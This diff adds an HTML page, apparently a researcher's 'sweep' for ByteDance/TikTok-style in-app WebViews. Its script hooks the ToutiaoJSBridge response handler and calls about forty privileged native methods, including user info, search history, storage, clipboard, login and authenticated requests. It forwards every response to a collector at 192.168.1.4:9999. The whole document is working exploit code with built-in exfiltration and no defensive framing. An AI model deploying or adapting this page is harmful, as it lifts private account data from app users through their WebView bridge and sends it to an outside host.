@@ -1,0 +1,47 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>R47 sweep</title></head>
+<body><h3 id="st">R47 JSB sweep</h3><script>
+(function(){
+  var COLLECT='http://192.168.1.4:9999/collect';
+  function send(tag,d){d=''+d;try{fetch(COLLECT+'?tag='+encodeURIComponent(tag),{method:'POST',mode:'no-cors',body:d.substring(0,3000)});}catch(e){}try{new Image().src=COLLECT+'?tag='+encodeURIComponent(tag)+'&d='+encodeURIComponent(d.substring(0,1200));}catch(e){}try{document.getElementById('st').textContent=tag;}catch(e){}}
+  var METHODS=[
+    ['appInfo',{}],['getAppInfo',{}],['uniAppInfo',{}],['userInfo',{}],['uniUserInfo',{}],
+    ['getSettings',{}],['getSearchHistory',{}],['getABTestParams',{}],['adInfo',{}],
+    ['getContainerData',{}],['getWebViewInfo',{}],['getNativeSiteCustomData',{}],
+    ['getSharedMemoryItem',{key:'r47'}],['setSharedMemoryItem',{key:'r47x',value:'1'}],
+    ['x.getStorageItem',{key:'r47'}],['x.setStorageItem',{key:'r47y',value:'1'}],
+    ['getPrefetchResult',{}],['x.subscribeEvent',{event:'r47'}],['x.updateGecko',{channel:'r47ch',accessKey:'r47ak'}],
+    ['sendLogV3',{eventName:'r47'}],['copyTextToPasteBoard',{content:'r47'}],['copyContent',{content:'r47'}],
+    ['broadcast',{event:'r47'}],['noticePermission',{}],['bdturing',{}],
+    ['openAlert',{title:'r47'}],['share',{title:'r47'}],['launchChat',{uid:'1'}],
+    ['openSchema',{schema:'aweme://webview?url=https%3A%2F%2Fexample.com%2Fr47'}],
+    ['openBrowser',{url:'https://example.com/r47'}],['openHybrid',{url:'https://example.com/r47'}],
+    ['openAwemeDetail',{aweme_id:'1'}],['openLive',{}],['openPhoneArea',{}],['openScan',{}],
+    ['openRechargePanel',{}],['openLightLandingPage',{url:'https://example.com/r47'}],
+    ['loadGeckoResources',{}],['fileSelection',{}],['x.request',{url:'https://webcast.tiktok.com/webcast/room/info/?aid=1180&room_id=1'}],
+    ['fetch',{url:'https://webcast.tiktok.com/webcast/room/info/?aid=1180&room_id=1',method:'GET'}],
+    ['login',{}]
+  ];
+  var bridges=[];['ToutiaoJSBridge','BDXBridge','JSBridge','JS2NativeBridge'].forEach(function(k){try{if(window[k])bridges.push(k);}catch(e){}});
+  send('sweep_load','url='+location.href+' bridges='+bridges.join(','));
+  if(!window.ToutiaoJSBridge){send('sweep_nobridge','none');return;}
+  var orig=window.ToutiaoJSBridge._handleMessageFromToutiao;
+  window.ToutiaoJSBridge._handleMessageFromToutiao=function(s){
+    try{var t=(typeof s==='string')?s:JSON.stringify(s);send('sw_resp',t.substring(0,2800));}catch(e){}
+    try{if(orig)orig.call(window.ToutiaoJSBridge,s);}catch(e){}
+  };
+  function flush(){try{var f=document.getElementById('__JSBridgeIframe__')||document.createElement('iframe');f.id='__JSBridgeIframe__';f.style.display='none';document.documentElement.appendChild(f);f.src='bytedance://dispatch_message/';}catch(e){}}
+  var i=0;
+  var iv=setInterval(function(){
+    if(i>=METHODS.length){clearInterval(iv);send('sweep_done','all '+METHODS.length);return;}
+    var m=METHODS[i];
+    try{
+      var msg={__msg_type:'call',__callback_id:'sw'+i+'_'+m[0],func:m[0],params:m[1],JSSDK:'5.2.30',namespace:'',__iframe_url:'',permissionGroup:'private',token:'sw-'+Date.now()};
+      window.ToutiaoJSBridge.invokeMethod(JSON.stringify(msg));
+      send('sw_fire',m[0]+' #'+i);
+      flush();
+    }catch(e){send('sw_err',m[0]+' '+e);}
+    i++;
+  },2600);
+})();
+</script></body></html>
